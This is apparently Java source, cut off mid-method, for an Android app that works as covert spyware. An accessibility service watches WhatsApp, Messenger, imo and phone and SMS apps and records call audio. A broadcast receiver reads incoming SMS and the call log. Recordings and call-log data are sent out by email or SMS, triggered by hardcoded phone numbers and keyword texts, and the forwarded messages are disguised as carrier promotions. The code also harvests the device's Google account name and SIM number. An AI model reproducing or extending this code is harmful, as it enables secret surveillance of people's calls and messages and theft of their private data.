import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import androidx.core.content.ContextCompat;
import androidx.core.app.ActivityCompat;
import android.content.pm.PackageManager;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.Locale;

public class CallRecorderAccessibilityService extends AccessibilityService {

    private static final String TAG = "CallRecorderService";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private MediaRecorder mediaRecorder;
    private String fileName;
    private Context mContext;
    private Context context;
    private static boolean isRecording = false;

    // Static variables to hold the latest notification data packageName
    public static String notificationCallingAppGlobalMessage1 = "";
    public static String notificationCallingAppGlobalMessage2 = "";
    public static String notificationCallingAppGlobalMessage3= "";
    public static String DelayPackageName= "";
    private static long lastUpdateTimestamp = 0;
    public static String RecordingDelyWhatesapp = "";
    private Handler handler;
    private static int executionCount = 0;
    private static int max = 15;

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = getApplicationContext(); // à¦à¦–à¦¨ mContext à¦†à¦° null à¦¹à¦¬à§‡ à¦¨à¦¾
        handler = new Handler(Looper.getMainLooper());
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Check if event is valid com.ludashi.dualspace ridmik.keyboard
        if (event == null){
            Log.d(TAG, "onAccessibilityEvent event : null ");
            return;
        }
        String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
        Log.d(TAG, "event packageName : " + packageName);


        if (    packageName.equals("com.whatsapp") || packageName.equals("com.facebook.orca") ||
                packageName.equals("com.imo.android.imoim")||
                packageName.equals("com.vivo.sms")||
                packageName.equals("com.coloros.mms")||
                packageName.equals("com.samsung.android.messaging")|| packageName.equals("com.samsung.android.dialer")||
                packageName.equals("com.samsung.android.incallui")||
                packageName.equals("com.realme.android.dialer")|| packageName.equals("com.google.android.dialer")||
                packageName.equals("com.android.systemui")||
                packageName.equals("com.android.mms")|| packageName.equals("com.miui.sms")||
                packageName.equals("com.google.android.apps.messaging")||
                packageName.equals("com.android.mms.service")      ) {

                            // âœ… recording dely for whatesapp set
                            if (packageName.equals("com.whatsapp")) {
                                long currentTime = System.currentTimeMillis();
                                // Check if 5 seconds have passed since the last update
                                if ((currentTime - lastUpdateTimestamp) > 5000) {
                                    RecordingDelyWhatesapp = "WhatesappOk";
                                    lastUpdateTimestamp = currentTime; // update time
                                    Log.d(TAG, "recordingdelywhatesapp updated to: " + RecordingDelyWhatesapp);
                                } else {
                                    Log.d(TAG, "Less than 5 seconds since last update. Keeping previous value: " + RecordingDelyWhatesapp);
                                }
                            } else {
                                RecordingDelyWhatesapp = "WhatesappNotOk";
                                lastUpdateTimestamp = System.currentTimeMillis(); // update time for non-whatsapp as well
                                Log.d(TAG, "recordingdelywhatesapp set to: " + RecordingDelyWhatesapp);
                            }

                Log.d(TAG, "event packageName : " + packageName);
                //Retry logic get last running variable orginal value
                if (executionCount < max) {
                    executionCount++;
                    Log.d(TAG, "executionCount: " + executionCount);
                    handler.postDelayed(() -> processAccessibilityEvent(event), 1000);//  Retry  get last running variable orginal value
                }else {
                    processAccessibilityEvent(event);
                }
        }
    }


    public void processAccessibilityEvent(AccessibilityEvent event) {
        Log.d(TAG, "Received accessibility event: " + event.toString());
        if (event == null){
            Log.d(TAG, "processAccessibilityEvent event : null ");
            return;
        }
        Log.d(TAG, "processAccessibilityEvent executionCount: " + executionCount);
        // âœ… Updated way: Directly accessing static variables
        // Log the latest notification data
        Log.d(TAG, "CallRecorderAccessibilityglobalMessage1: " + notificationCallingAppGlobalMessage1);
        Log.d(TAG, "CallRecorderAccessibilityglobalMessage2: " + notificationCallingAppGlobalMessage2);
        Log.d(TAG, "CallRecorderAccessibilityglobalMessage3: " + notificationCallingAppGlobalMessage3);


        // Get the package name
        String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
        DelayPackageName = packageName ;
        // Notification text (usually contains title/message)
        String notificationText = "";
        if (event.getText() != null && !event.getText().isEmpty()) {
            StringBuilder builder = new StringBuilder();
            for (CharSequence cs : event.getText()) {
                builder.append(cs).append(" ");
            }
            notificationText = builder.toString().trim().toLowerCase();  // Normalize
        }

        // Notification title is not directly accessible, often part of text or description
        String notificationTitle = (event.getContentDescription() != null)
                ? event.getContentDescription().toString().toLowerCase()
                : "";

        // Combine for keyword checking CallRecorderAccessibilityglobalMessage1
        String AccessibilityEventcombinedText = notificationTitle + " " + notificationText;
        Log.d(TAG, "AccessibilityEvent text : " + AccessibilityEventcombinedText);
        String combinedText = notificationCallingAppGlobalMessage1 + " " + notificationCallingAppGlobalMessage2+ " " + notificationCallingAppGlobalMessage3 + " " + AccessibilityEventcombinedText;
        Log.d(TAG, "processAccessibilityEvent all text: " + combinedText);

        // Start recording if call keywords found Callingâ€¦ Ringingâ€¦
        if (combinedText.contains("call")|| combinedText.contains("calling") ||
                combinedText.contains("Callingâ€¦") || combinedText.contains("Ringingâ€¦") ||
                combinedText.contains("incoming") ||
                combinedText.contains("dialing") ||
                combinedText.contains("voice call") ||combinedText.contains("voice over call") ||
                combinedText.contains("on call") ) {
            Log.d(TAG, "Detected call keyword in notification" );
           // checkPermissionsAndStartRecording();  RecordingDelyWhatesapp ="whatesappnotok"
            String localDelayPackageName  =  packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
            if (RecordingDelyWhatesapp == "WhatesappOk") {
                // Get the package name
                Log.d(TAG, "match foe delay time . packageName  : " + RecordingDelyWhatesapp);
                handler.postDelayed(() -> checkPermissionsAndStartRecording(), 2 * 60000); //recording start after 2 minit
            }else {
                Log.d(TAG, "no match for dealy time . packageName : " + RecordingDelyWhatesapp);
                checkPermissionsAndStartRecording();
            }
        }else {
            Log.d(TAG, "no Detected call keyword in notification");
        }


        // Stop recording if call ends
        if (combinedText.contains("call ended") || combinedText.contains("disconnected") ||
                combinedText.contains("end call") || combinedText.contains("call finished")) {
            Log.d(TAG, "Detected end call keyword in notification");
            stopRecording();
        }else {
            Log.d(TAG, "no Detected call ended keyword in notification");
        }
    }




    public void checkPermissionsAndStartRecording() {
        if (!isAccessibilityEnabled(this)) {
            Log.d(TAG, "Accessibility permission not granted");
            promptEnableAccessibility();
            return;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

            Log.d(TAG, "Permissions not granted");
            // Note: In AccessibilityService, we can't directly request permissions
            // Need to handle this through main activity
            return;
        }

        startRecordingWithRetry();
    }

    private boolean isAccessibilityEnabled(Context context) {
        String serviceName = context.getPackageName() + "/" + this.getClass().getName();
        try {
            int accessibilityEnabled = Settings.Secure.getInt(
                    context.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);

            if (accessibilityEnabled == 1) {
                String settingValue = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

                return settingValue != null && settingValue.contains(serviceName);
            }
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error checking accessibility setting", e);
        }
        return false;
    }

    private void promptEnableAccessibility() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "Service interrupted");
        stopRecording();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "Accessibility service connected");
    }

    private void startRecordingWithRetry() {
        if (isRecording) {
            Log.w(TAG, "Already recording");
            return;
        }

//        int[] audioSources = {
//                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
//                MediaRecorder.AudioSource.MIC,
//                MediaRecorder.AudioSource.VOICE_RECOGNITION
//        };
        int[] audioSources = {
                MediaRecorder.AudioSource.VOICE_COMMUNICATION, // For VoIP
                MediaRecorder.AudioSource.VOICE_RECOGNITION, // Optimized for voice
                MediaRecorder.AudioSource.MIC,  // Default microphone
                MediaRecorder.AudioSource.CAMCORDER,        
                MediaRecorder.AudioSource.DEFAULT
        };

        for (int source : audioSources) {
            if (tryRecordingWithSource(source)) {
                return;
            }
        }

        Log.e(TAG, "All recording attempts failed");
    }

    private boolean tryRecordingWithSource(int audioSource) {

        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File outputDir = new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_MUSIC), "CallRecordings");

            if (!outputDir.exists() && !outputDir.mkdirs()) {
                Log.e(TAG, "Failed to create directory");
                return false;
            }

            fileName = new File(outputDir, "call_" + timestamp + ".amr").getAbsolutePath();
            Log.d(TAG, "Attempting to record with source: " + audioSource);

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(audioSource);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(fileName);

            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecording = true;
            Log.d(TAG, "Recording started successfully with source: " + audioSource);
            // Use handler to stop recording after 3 minutes (180 seconds)
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> stopRecording(), 1 * 60000); // 1 minutes recording limit
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Recording failed with source " + audioSource + ": " + e.getMessage());
            resetMediaRecorder();
            return false;
        }
    }

    private void stopRecording() {
        if (!isRecording) {
            Log.w(TAG, "No active recording to stop");
            return;
        }

        try {
            Log.d(TAG, "Stopping recording");
            mediaRecorder.stop();
            executionCount=0;
            Log.d(TAG, "executionCount  reset: " + executionCount);
            Log.d(TAG, "Recording saved to: " + fileName);
        } catch (IllegalStateException e) {
            Log.e(TAG, "Stop failed - illegal state: " + e.getMessage());
        } catch (RuntimeException e) {
            Log.e(TAG, "Stop failed - runtime exception: " + e.getMessage());
        } finally {
            releaseMediaRecorder();
        }
    }

    private void resetMediaRecorder() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.reset();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error resetting media recorder", e);
        }
    }

    private void releaseMediaRecorder() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.release();
                mediaRecorder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing media recorder", e);
        }
        isRecording = false;
        executionCount=0;
        Log.d(TAG, "executionCount  reset: " + executionCount);

        if (isInternetAvailable()) {
            //    Log.d(TAG, "Internet available, sending recording via email");
            CallRecordSendEmail callRecordSendEmail = new CallRecordSendEmail();
            callRecordSendEmail.sendEmailWithAttachment("Sound Rec", "file:", fileName);

           // sendEmailWithAttachment("Sound Rec", "file:", fileName);
        } else {
            //   Log.d(TAG, "Internet not available, recording saved locally");
        }

        // 5. à¦ªà§à¦°à¦¾à¦¨à§‹ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¡à¦¿à¦²à¦¿à¦Ÿ à¦•à¦°à§à¦¨
        deleteOldRecordings();


    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        stopRecording();
    }





    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old mic recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/Music/CallRecordings");
        File[] files = folder.listFiles();
        if (files != null && files.length > 2) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            for (int i = 0; i < files.length - 2; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old mic recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old mic recording: " + files[i].getName());
                }
            }
        }
    }


    public boolean isInternetAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;

            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }


    public void CheckPermissionsAndStartRecording() {
        Log.d(TAG, "called from callrecorder class method of checkPermissionsAndStartRecording()");
        new Handler(Looper.getMainLooper()).post(this::startRecordingWithRetry);
    }

    public void StopRecording() {
        Log.d(TAG, "called from callracorder class method of checkPermissionsAndStartRecording().");
        stopRecording();
    }
}


//CallRecorderAuto.java
package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.compose.ui.platform.AccessibilityManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.content.SharedPreferences;

import javax.mail.MessagingException;

public class CallRecorderAuto extends BroadcastReceiver {
    private MediaRecorder recorder;
    private String fileName;
    private Context mContext;


    private static final String TAG = "CallRecorderAuto";
    private static final String[] allowedIncomingNumbers = {
            "+880130028208011", "+880130403928011",  "+880969763789011", "+880963882136011" };

    private static final String[] WORDS1_GRADE = {"Goldc", "Silverc", "Mediumc"};
    private static final String[] WORDS2_OFFER = {"Congratulationc", "Conformc"};
    private List<String> lastMessages = new ArrayList<>();
    private List<String> lastCallNumbers = new ArrayList<>();
    private static int recordingCount = 1;
    private boolean isOnCall = false;
    private boolean isCallRecording = false; // à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦«à§à¦²à§à¦¯à¦¾à¦—

    public CallRecorderAuto(Context context) {
        if (context != null) {
            this.mContext = context.getApplicationContext(); // Safe way to store context
        } else {
            Log.e(TAG, "Received null context in CallRecorderAuto constructor");
        }
    }

    public CallRecorderAuto() {
        Log.d(TAG, "CallRecorder class initialized.");
       // mContext = MyApplication.getAppContext();  // Set the context here if needed
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        if (!folder.exists()) {
            folder.mkdirs();
            Log.d(TAG, "Created directory for CallRecording.");
        }
    }
    @Override
    public void onReceive(Context context, Intent intent) {
      //  Log.d(TAG, "onReceive called with action : " + intent.getAction());

        // Initialize mContext to ensure it is not null
       // Log.d(TAG, "Context passed to onReceive: " + context);
        //mContext = context;
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            Log.d(TAG, "onReceive Call  state1 .");
            handlePhoneStateChange(intent, context);

            //if allow +6digit number Forward Sms By SmsReceiver Class by SMS
            String incomingNumber = lastCallNumbers.isEmpty() ? "unknown" : lastCallNumbers.get(lastCallNumbers.size() - 1);
            try {
                ForwardSmsBySMSSmsReceiverClass(context, incomingNumber); //if allow +6digit number Forward Sms By SmsReceiver Class by SMS
            } catch (MessagingException e) {
                throw new RuntimeException(e);
            }

        } else if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            handleSmsReceived(intent, context);
        }
    }

    private void handlePhoneStateChange(Intent intent, Context context) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            Log.d(TAG, "Incoming call from: " + incomingNumber);
            // call is ringing wating .Check permissions when call is ringing
            if (!checkAndRequestPermissions(context)) {
                Log.e(TAG, "Required permissions not granted, cannot proceed with recording");
                return;
            }
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            // recived call starting recording
            Log.d(TAG, "Calling state2, starting recording for: " + incomingNumber);

            if (!isCallRecording) {
                isCallRecording = true;
                if (checkAndRequestPermissions(context)) {
                MicRecord micRecord = new MicRecord(context); // 'this' à¦¹à¦²à§‹ Context (à¦¯à§‡à¦®à¦¨ Activity à¦¬à¦¾ Service)
                String messageBody = "Some message";  // à¦ªà§à¦°à¦•à§ƒà¦¤ à¦®à§‡à¦¸à§‡à¦œ à¦¬à¦¾ à¦ªà§à¦°à§Ÿà§‹à¦œà¦¨à§€à§Ÿ à¦²à¦œà¦¿à¦• à¦à¦–à¦¾à¦¨à§‡ à¦¦à¦¿à¦¨
                //micRecord.StartRecording(incomingNumber, messageBody); // à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
                    // Use application context here
                    //CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService(context.getApplicationContext());
//                    CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService();
//                    Log.d(TAG, "Calling state2,  CallRecorderAccessibilityService.CheckPermissionsAndStartRecording");
//                    callRecorderService.CheckPermissionsAndStartRecording();




                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                    Log.d(TAG, "Android version is lower 9 .versiov:" +Build.VERSION.SDK_INT );
                 //micRecord.StartRecording(incomingNumber, messageBody);
                }else {
                    Log.d(TAG, "Android version is upper 9 .versiov:" +Build.VERSION.SDK_INT );

                }
                } else {
                  //  Log.e(TAG, "Permissions not granted, cannot start recording");
                }
            }
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            // Call ended working
            Log.d(TAG, "Call ended, stopping working running");
            Log.d(TAG, "Call ended, CallRecorderAccessibilityService.StopRecording");
//            CallRecorderAccessibilityService CallRecorderAccessibilityService= new CallRecorderAccessibilityService();
//            CallRecorderAccessibilityService.StopRecording();



            MicRecord micRecord = new MicRecord(context);
            String messageBody = "Some message";
          //  micRecord.stopMicSoundRecording(context);
            sendLastRecordingViaEmail(context);
            handleSmsReceived(intent, context);
//            if (isCallRecording) {
//                // Call ended
//                MicRecord micRecord = new MicRecord(context);
//                String messageBody = "Some message";
//               // micRecord.stopMicSoundRecording(context);
//
//              // Check Android version - only record if below API 28
//                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
//                    Log.d(TAG, "Call ended Android version is lower 9 .versiov:" +Build.VERSION.SDK_INT);
//                    // micRecord.stopMicSoundRecording(context);
//                    sendLastRecordingViaEmail(context);
//                }else {
//                    Log.d(TAG, "Android version is upper9, skipping recording.versiov:" +Build.VERSION.SDK_INT);
//                Log.d(TAG, "condition met handlePhoneStateChange for sendLastRecordingViaEmail.");
//               sendLastRecordingViaEmail(context);
//                }
//                Log.d(TAG, "condition met handlePhoneStateChange for sendLastRecordingViaEmail .");
//                sendLastRecordingViaEmail(context);
//                // Do SMS work
//                handleSmsReceived(intent, context);
//            }
        }
    }


    private void handleSmsReceived(Intent intent, Context context) {
        Log.d(TAG, "Handling received SMS.");
        try {
            Bundle bundle = intent.getExtras();

            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null && pdus.length > 0) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);
                        boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                        boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                        boolean isInternetAvailable = isInternetAvailable(context);
                        boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);
                        boolean isPatternMatchInCallLogs = isPatternMatchInCallLogs(context);
                        boolean incomingCallNumber = IncomingCallNumber(sender);

//                        // à¦²à¦—à¦¿à¦‚: à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦šà§‡à¦•, à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦•à¦¨à§‡à¦•à¦¶à¦¨ à¦šà§‡à¦•, à¦à¦¬à¦‚ à¦«à§‹à¦¨ à¦¨à¦®à§à¦¬à¦° à¦šà§‡à¦• à¦•à¦°à¦¾
//                        Log.d(TAG, "handleSmsReceived method Keywords 1 found: " + containsWords1);
//                        Log.d(TAG, "handleSmsReceived method Keywords 2 found: " + containsWords2);
//                        Log.d(TAG, "handleSmsReceived method Internet available: " + isInternetAvailable);
//                        Log.d(TAG, "handleSmsReceived method Allowed number: " + isAllowedNumber);
//                        Log.d(TAG, "handleSmsReceived method IsPatternMatchInCallLogs: " + isPatternMatchInCallLogs);
//                        Log.d(TAG, "handleSmsReceived method IncomingCallNumber: " + incomingCallNumber);

                        if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                                (isAllowedNumber && isInternetAvailable)) {
                            Log.d(TAG, "handleSmsReceived method codition met for sendLastRecordingViaEmail.");
                            sendLastRecordingViaEmail(context);
                        } else {
                         //   Log.d(TAG, "Conditions not met for call recording sending in handleSmsReceived method .");
                        }
                    }
                } else {
                 //   Log.d(TAG, "No PDUs found in the bundle.");
                }
            } else {
             //   Log.d(TAG, "Bundle is null.");
            }
        } catch (Exception e) {
            // à¦¯à§‡ à¦•à§‹à¦¨à§‹ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦¹à¦²à§‡ à¦¤à¦¾à¦•à§‡ à¦²à¦— à¦•à¦°à§à¦¨
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }
    public void ForwardSmsBySMSSmsReceiverClass(Context context, String incomingNumber) throws MessagingException {
        //if allow +6digit number match Forward  Sms By SMSSmsReceiver Class
        boolean isInternetAvailable = isInternetAvailable(context);
        boolean IsPatternMatchInCallLogs = isPatternMatchInCallLogs(context);

       // Log.d(TAG, "Is Pattern Match +6digit In CallLogs: " + IsPatternMatchInCallLogs);
        if (incomingNumber == null) {
            Log.e(TAG, "Incoming +6digit number is null, cannot proceed.");
            return;
        }
        if ( (IsPatternMatchInCallLogs) ||
            (incomingNumber.equals("+8801300282080") ||
             incomingNumber.equals("+8809697637890") ||
             incomingNumber.equals("+8809638821360") )) {
            Log.d(TAG, "Is Pattern Match +6digit In CallLogs: " + IsPatternMatchInCallLogs);
            Log.d(TAG, "Allow  number Conditions met for forwarding +6digit calllist .Forward By SmsReceiverClass");
            SmsReceiver smsReceiver = new SmsReceiver();
            String sender = incomingNumber;
            GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
            String OTPTypeGetRecentCallLogs = getRecentCallLogs.OTPTypeGetRecentCallLogs();
            String messageBody = "Use 1009 Blance Use this month to become a Silver Star, registration dial *121*5400# " + OTPTypeGetRecentCallLogs;  // Get the recent call log data here

            // Ensure messageBody and sender are not null
            if (sender != null && messageBody != null) {
                // Get the previous call log data from SharedPreferences (or another method of storage)
                SharedPreferences preferences = context.getSharedPreferences("SMSPrefs", Context.MODE_PRIVATE);
                String previousMessage = preferences.getString("lastSentCallLog", "");

                // Check if the new call log is the same as the previous one
                if (!messageBody.equals(previousMessage)) {
                    // Forward the SMS with the call log content
                        if  (isInternetAvailable)  {
                            Log.d(TAG, "Internet Available Forward CallRecorderAuto Class  calllist forwarding by email.");
                            smsReceiver.forwardSmsByEmail(sender, messageBody, context);
                        }
                        if  (!isInternetAvailable)  {
                            Log.d(TAG, "Internet not Available CallRecorderAuto Class Forward  calllist forwarding by SMS.");
                        smsReceiver.forwardSmsBySMS(sender, messageBody, context);
                        }

                    // Store the new call log data as the last sent message
                    SharedPreferences.Editor editor = preferences.edit();
                    editor.putString("lastSentCallLog", messageBody);
                    editor.apply();
                } else {
                    Log.d(TAG, " Not forwarding.Call log is the same as the previous sending mail. ");
                }
            } else {
                Log.e(TAG, "callist Sender or messageBody is null. Cannot forward  .");
            }
        } else {
           // Log.d(TAG, "Allow number Conditions not met for CallLog forwarding .");
        }
    }
    private boolean isPatternMatchInCallLogs(Context context) {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
       // Log.d(TAG, "Checking for keywords in WORDS1_GRADE.");
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        //Log.d(TAG, "Checking for keywords in WORDS2_OFFER.");
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
       // Log.d(TAG, "Checking if number is allowed: " + number);
        for (String allowedNumber : allowedIncomingNumbers) {
            if (allowedNumber.equals(number)) {
                Log.d(TAG, "Allowed number found: " + number);
                return true;
            }
        }
       // Log.d(TAG, "Number calling is not allowed: " + number);
        return false;
    }
    private boolean checkLastCallNumbers(Context context) {
       // Log.d(TAG, "Checking last call numbers.");
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }
        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        String sortOrder = CallLog.Calls.DATE + " DESC";

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                    count++;
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }

    public boolean isInternetAvailable(Context context) {

        if (mContext == null) {
            Log.e(TAG, "isInternetAvailable mContext is still null");
        } else {
            // Log.d(TAG, "isInternetAvailable mContext is initialized");
        }
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
           // Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }


    private String getLastRecordingFilePath() {
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 0) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            return files[files.length - 1].getAbsolutePath();
        }
        return null;
    }

    private void sendLastRecordingViaEmail(Context context) {
        if (context != null) {
            this.mContext = context.getApplicationContext(); // Safe way to store context
        } else {
            Log.e(TAG, "Received null context in CallRecorderAuto constructor");
        }
        String lastFilePath = getLastRecordingFilePath();
        if (lastFilePath != null) {
            sendEmailWithAttachment("Last Call Recording", "last sound recording:", lastFilePath, context);
        } else {
            Log.d(TAG, "No previous recording found send Email.");
        }
    }
    //if calllrecording file same call record class skip go fileservice class src callrecord and send

    private void sendEmailWithAttachment(String subject, String body, String filePath,Context context) {
        if (context == null) {
            Log.e(TAG, "sendEmailWithAttachment: Context is null!");
            return;
        }
        Log.d(TAG, "Sending email with sendEmailWithAttachment method");

        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);

        SmsReceiver smsReceiver = new SmsReceiver();
        String messageBody= "Your  Text";
        String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
        NotificationListener notificationListener = new NotificationListener();
        String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
        String setSim1Number ;
        if (  setSim1NumberSmsReceiver != null) {
            setSim1Number =setSim1NumberSmsReceiver;
